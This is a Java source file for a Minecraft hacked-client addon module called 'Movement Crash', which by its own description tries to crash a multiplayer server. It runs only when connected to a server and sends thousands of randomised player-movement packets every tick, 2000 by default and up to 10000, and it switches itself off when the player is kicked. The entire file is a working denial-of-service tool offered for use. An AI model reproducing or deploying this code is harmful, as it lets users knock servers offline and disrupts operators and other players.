package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class MovementCrash extends Module {

    private final Setting<Integer> packets;
    private final Setting<Boolean> autoDisable;

    public MovementCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Movement Crash", "CRYSTAL || Tries to crash the server by spamming move packets. (By 0x150)");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        packets = sgGeneral.add(new IntSetting.Builder()
            .name("packets")
            .description("How many packets to send per tick")
            .defaultValue(2000)
            .min(1)
            .sliderMax(10000)
            .build());
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
    }

    public static double randomDouble(double rad) {
        Random r = new Random();
        return r.nextDouble() * rad;
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            if (mc.getNetworkHandler() != null || mc.world == null) {
                try {
                    assert mc.player != null;
                    Vec3d current_pos = mc.player.getPos();
                    int i = 0;
                    if (i < packets.get()) {
                        do {
                            PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + getDistributedRandom(1),
                                current_pos.y + getDistributedRandom(1), current_pos.z + getDistributedRandom(1),
                                (float) randomDouble(90), (float) randomDouble(180), true);
                            mc.getNetworkHandler().sendPacket(move_packet);
                            i++;
                        } while (i < packets.get());
                    }
                } catch (Exception ignored) {
                    error("Stopping movement crash because an error occurred!");
                    toggle();
                }
            } else {
                return;
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    public double getDistributedRandom(double rad) {
        double v = randomDouble(rad) - (rad / 2);
        return v;
    }
}
